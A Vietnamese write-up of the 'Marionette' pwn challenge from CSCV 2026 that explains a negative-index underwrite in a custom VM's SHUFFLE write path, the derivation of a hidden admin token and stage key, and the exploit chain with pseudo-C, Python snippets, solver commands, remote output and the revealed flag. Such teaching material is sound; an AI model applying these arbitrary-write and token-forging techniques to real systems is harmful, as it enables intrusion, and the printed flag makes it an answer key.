---
title: "Marionette - CSCV 2026 (Tiếng Việt)"
slug: "marionette-cscv-2026-vi"
date: "2026-11-09"
description: "Khai thác lỗi SHUFFLE mode-1 underwrite với index âm trong một VM tuỳ biến (PuppetScript) để phóng to capacity của buffer và giải mã flag qua hidden opcode."
category: "pwn"
event: "CSCV 2026"
year: 2026
difficulty: "hard"
author: "Huyen Chi"
tags:
  - PWN
  - Custom VM
  - Integer Underwrite
  - Heap
  - CTF
status: "published"
quickLinks:
  - label: "Solver script"
    url: "/marionette-cscv-2026-vi/solve.py"
  - label: "English version"
    url: "/writeups/marionette-cscv-2026"
---

## Tóm tắt

Marionette là một challenge TCP forking server, hiện thực một VM tuỳ biến mang tên PuppetScript. Flag được lấy ra bằng cách khai thác lỗi **SHUFFLE mode-1 underwrite với index âm (signed-index underwrite)** để tăng capacity của một buffer hợp lệ vượt quá giới hạn `0x200` mà `NEWBUF` áp đặt, sau đó gọi hidden opcode `0x66` với một stage key được tính toán để giải mã flag page vào buffer đã bị phóng to, và cuối cùng in ra bằng `PRINTS`.

**Flag**: `CSCV2026{37ca8dffdf75512ac8c07a3e070e9f64}`

Ngay khi kết nối, chương trình khởi tạo một phiên VM mới và mã hóa flag vào vùng `stage_page` của VM. Client tương tác hoàn toàn với VM đó thông qua các message input đã được đóng frame — đây cũng là nơi bắt đầu chuỗi khai thác.

## Tổng quan Challenge

| Thuộc tính | Giá trị |
|---|---|
| Binary | `marionette` |
| Kiến trúc | ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped |
| SHA-256 | `d33e26c10a0bf05c1c4c3d6006d8e0fe3f684335575333dd2bbb0bdd8d789248` |
| Mitigation | Full RELRO, Stack Canary, NX, PIE, FORTIFY, Seccomp |
| Test local | `PUPPET_PORT=31337 PUPPET_FLAG=/tmp/flag PUPPET_TIMEOUT=120 ./marionette` |

## Framing của giao thức

Server nhận input được bọc trong một frame, big-endian:

```text
[u8 type][u32 seq][u64 mac][u16 len][payload]
```

**`type`** xác định cách server đọc hiểu payload:

| Giá trị | Mode | Ý nghĩa |
|---|---|---|
| `1` | RUN | Nạp và chạy bytecode trong `payload` trên VM |
| `2` | POOLINFO | Báo cáo trạng thái của pool (một cấu trúc dữ liệu của VM) |
| `3` | QUIT | Đóng connection |
| `0x50` | ADMIN | Phải có token đúng mới dùng được (ẩn — không xuất hiện trong banner) |

- **`seq`** duy trì thứ tự frame, phải tăng dần từ `1`.
- **`mac`** là hash `u64` **FNV1a64 chain** của `[seq LE32 \| prev_mac LE64 \| payload]`, offset basis `0xcbf29ce484223325`, được kiểm tra trên mọi frame.
- **`len`** là độ dài payload (`u16`).
- **`payload`** phụ thuộc vào `type`: RUN chứa `[u16 proglen BE][bytecode]`; POOLINFO/QUIT rỗng; ADMIN chứa token 8 byte.

## Kiến trúc VM

Mỗi session gồm 4 khối heap riêng biệt: **VM state** (`0xbe8`, chứa stack, pool, metadata, PRNG và các field dùng cho stage-decrypt), **decode table** (`0x2c0`, bảng XOR dùng để decode opcode và encoded handler pointer), **pool container** (chứa `pool_count` + `slots_ptr`, các object mà client có thể thao tác), và **output buffer**.

Các field liên quan đến exploit, đã verify theo disassembly:

| Offset | Field | Ghi chú |
|---|---|---|
| `+0x90c` | `stage_count` | số slot đang được đăng ký trong pool |
| `+0x910` | `container_ptr` | chính field bị SHUFFLE corrupt thông qua `*(container+0x08)` |
| `+0xab0` | PRNG state (xorshift64\*) | nuôi stage key |
| `+0xba8`/`+0xbb0`/`+0xbb8` | `stage_page` / `stage_hash` / `stage_key_material` | flag page mã hóa và dữ liệu dùng để validate/giải mã |
| `+0xbc8` | `stage_door_ready` | điều kiện mở cho hidden opcode `0x66` |

### Cấu trúc pool array

| Offset | Field | Mô tả |
|---|---|---|
| `+0x00` | `pool_count` | Số slot (prelude = 6) |
| `+0x08` | `pool_pointer` | Con trỏ đến mảng slot — **target của SHUFFLE index=-2** |
| `+0x18` | `pool[0]` | Slot 0: owned buffer (cap = `0x200`) |
| `+0x20` | `pool[1]` | Slot 1: owned buffer (cap = `0x200`) |

## Lỗ hổng: SHUFFLE mode-1 underwrite với index âm

SHUFFLE là một thao tác stack-based của VM, dùng để đọc hoặc viết một slot trong pool:

```c
void shuffle(VM *vm) {
    int64_t mode = pop();      // 0 = read, 1 = write
    int64_t val  = pop();      // value to write (mode=1)
    int64_t idx  = pop();      // signed index

    if (mode == 0) {  // READ path - AN TOÀN
        idx = (idx % stage_count + stage_count) % stage_count;  // chuẩn hóa index âm
        push(vm->pool[idx]);
    } else {  // WRITE path - LỖI
        idx = idx % stage_count;  // C semantics: -2 % 6 = -2 (không chuẩn hóa!)
        vm->pool[idx] = val;      // pool bắt đầu tại container+0x18
    }
}
```

Path `read` chuẩn hóa index âm về `[0, stage_count)`, nhưng **path `write` thì không**. Với `stage_count >= 2` (prelude đăng ký 6 slot), một lần write với `idx = -2` sẽ rơi vào `container+8`, tức chính `pool_pointer` — không nằm trong mảng pool.

Ở path write, phép gán thực chất là `*(pool_pointer + idx * 8) = val`, do đó:

1. `SHUFFLE mode=1, idx=-2, val=&owned_buffer->capacity` đổi `pool_pointer` thành địa chỉ field `capacity` của object đích.
2. `SHUFFLE mode=1, idx=0, val=520` sau đó ghi `520` (> `0x200`) qua con trỏ đã bị chiếm quyền, đặt `capacity` của object đích thành `520`.

Object vẫn hợp lệ theo mọi kiểm tra (magic `PPTS`, cookie khớp, có trong owned-list) nhưng giờ báo `capacity = 520 > 0x200` — chính là điều kiện mà hidden decrypt opcode kiểm tra.

**Lưu ý:** `stage_count` theo dõi số object đã được đăng ký, nên phải có ít nhất **2 object** trước lần SHUFFLE write đầu tiên — một trong số đó sẽ là object đích được truyền vào opcode `0x66`.

## Hidden Opcode `0x66` — Stage Decrypt

```c
bool hidden_0x66(VM *vm) {
    uint64_t key = pop();
    Object *dst = pop_object();  // validate owned, kind 0/1, data != NULL

    if (dst->capacity <= 0x200) return false;        // gate bị vượt qua nhờ underwrite
    if (!stage_door_ready(vm)) return false;          // state+0xba8/0xbc8

    mprotect(vm->stage_page, 0x1000, PROT_READ|PROT_WRITE);
    if (mix(key) != vm->stage_hash) {                 // state+0xbb0
        mprotect(vm->stage_page, 0x1000, PROT_READ);
        return false;
    }
    decrypt_copy(vm->stage_page, dst->data, key, vm->stage_key_material);
    dst->used_len = 0x100;  // độ dài flag
    mprotect(vm->stage_page, 0x1000, PROT_READ);
    clear_stage_scratch(vm);
    return true;
}
```

Để chạm được opcode này cần cả hai điều kiện: bypass capacity ở trên, và `stage_door_ready`, chỉ được set khi gửi thành công frame `ADMIN` (type `0x50`) ẩn.

### Admin Token & Stage Key

Handler của frame `0x50` tính một token 8 byte một cách deterministic từ nonce theo session, được in trong banner:

```python
D = 0x7c4a9e1d3b5f2068
G = 0x9fcefcacc5ea5bfb

ab0 = D ^ nonce
for _ in range(14):
    ab0 = xorshift64(ab0)

token = fmix64(G ^ fmix64(ab0))   # fmix64 = MurmurHash3 finalizer
```

Gửi type `0x50` với token này trả về `#OK` và mở stage door. Cùng trạng thái PRNG (`ab0`) đó sẽ nuôi stage key cần cho `0x66`:

```python
stage_key = vm_ab0 ^ fmix64(vm_ab0 ^ fnv1a64(admin_payload)) ^ G ^ flag_prefix_word
# flag_prefix_word = u64_le("CSCV2026"), zero-padded
```

## Chuỗi khai thác

```text
1. CONNECT
   └─ Nhận banner → parse SESSION NONCE (16 hex digit)

2. TÍNH ADMIN TOKEN (offline, deterministic từ nonce)
   ├─ ab0 = D ^ nonce, 14 lần xorshift64, token = fmix64(G ^ fmix64(ab0))
   └─ Gửi frame TYPE 0x50 với token → #OK, stage door mở

3. SHUFFLE UNDERWRITE (tạo buffer bị phóng to)
   ├─ GETSLOT 0 → push owned_buffer (slot 0, cap=0x200)
   ├─ SHUFFLE mode=1, idx=-2, val=owned_buffer+12   (ghi đè pool_pointer)
   └─ SHUFFLE mode=1, idx=0,  val=520                (đặt capacity=520)

4. TÍNH STAGE KEY từ trạng thái PRNG đã lưu ở bước 2 + token + G + flag prefix

5. GỌI HIDDEN OPCODE 0x66
   ├─ GETSLOT 0 (push buffer đã phóng to)
   ├─ PUSH stage_key
   └─ RAW_OPCODE_0x66  → giải mã flag page vào buffer, đặt used_len=0x100

6. PRINTS → FLAG
```

Mapping giữa raw opcode byte và internal index là session-dependent (mã hóa XOR theo từng session), nên exploit tự tính các giá trị này tại runtime thay vì hardcode raw byte.

## Nguyên nhân gốc

| Lỗ hổng | Vị trí | Nguyên nhân gốc | Primitive |
|---|---|---|---|
| SHUFFLE mode-1 underwrite với index âm | SHUFFLE handler | Write path dùng phép chia dư có dấu `%` của C mà không chuẩn hóa index âm, trong khi read path có làm điều này. Validation cho phép `idx ∈ [-stage_count, stage_count)` nhưng chỉ read path map đúng range đó về trong bound. | Ghi tùy ý một qword vào `container+8` qua `idx=-2`, sau đó ghi tùy ý qua con trỏ đã bị chiếm quyền |

## Solver Script

Exploit đầy đủ hiện thực: client đóng frame với MAC FNV1a64 đúng, parse nonce, tính admin token, thực hiện SHUFFLE underwrite, tính stage key, và cuối cùng gọi `0x66` + `PRINTS`. Xem [`solve.py`](/marionette-cscv-2026-vi/solve.py).

```bash
# Local
python3 solve.py 127.0.0.1 31337

# Remote
python3 solve.py <host> <port> CSCV2026
```

**Output remote**:

```text
SESSION NONCE 000a1b2c3d4e5f67
READY
#OK
#OK
0x000000000000007b
#OK
CSCV2026{37ca8dffdf75512ac8c07a3e070e9f64}
#OK
```

## Flag

<details>
  <summary>Click to reveal</summary>

```text
CSCV2026{37ca8dffdf75512ac8c07a3e070e9f64}
```

</details>
